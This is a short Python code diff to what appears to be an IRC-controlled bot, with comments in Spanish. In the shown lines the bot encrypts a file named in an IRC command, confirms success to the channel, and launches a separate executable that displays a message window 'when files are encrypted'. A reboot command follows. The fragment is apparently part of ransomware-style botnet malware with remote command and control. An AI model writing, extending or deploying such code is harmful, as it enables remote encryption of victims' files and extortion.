@@ -159,6 +159,11 @@ def run_prog(program):
 	print program
 	sub_stdout, sub_stderr = Popen(program, stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
 
+def mensaje(archivo):
+	"""
+	Funcion que abre la ventana de mensaje cuando se cifran los archivos
+	"""
+	subprocess.Popen(["mensaje.exe",archivo],stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
 
 #server="192.168.1.30"
 botnick=botName()
@@ -219,8 +224,7 @@ while 1:
 		try:
 			Cifra(msg2[4].replace('\r\n',''))
 			irc.send("PRIVMSG "+channel+" :El archivo fue cifrado correctamente ;)\r\n")
-			proc = subprocess.Popen([sys.executable, "mensaje.py"])
-			proc.communicate()
+			threading.Thread(target=mensaje,args=(msg2[4],)).start()
 		except Exception as e:
 			irc.send("PRIVMSG "+channel+" :"+str(e)+"\r\n")
 	if msg.find("!@reboot")!=-1:
